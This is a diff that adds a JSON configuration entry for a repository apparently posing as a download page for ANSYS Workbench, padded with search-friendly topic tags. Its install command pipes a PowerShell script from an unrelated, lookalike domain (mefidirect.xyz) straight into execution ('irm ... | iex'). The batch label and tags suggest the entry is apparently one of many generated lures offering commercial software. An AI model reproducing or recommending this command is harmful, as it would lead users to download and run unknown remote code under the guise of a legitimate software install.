@@ -1,0 +1,29 @@
+{
+  "repo": "ansys-workbench-commercial-version",
+  "product": "ANSYS Workbench Commercial Version",
+  "kind": "cad",
+  "install_type": "download",
+  "download_url": "https://ansys.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "cad",
+  "topics": [
+    "ansys-app",
+    "ansys-utility",
+    "mechanical-cad",
+    "install-guide",
+    "ansys-for-windows",
+    "windows-10",
+    "user-manual",
+    "3d-modeling",
+    "windows-11",
+    "quick-tips",
+    "drafting-tools",
+    "ansys-windows-guide",
+    "ansys-download-page",
+    "ansys-setup-guide-2026",
+    "getting-started"
+  ]
+}
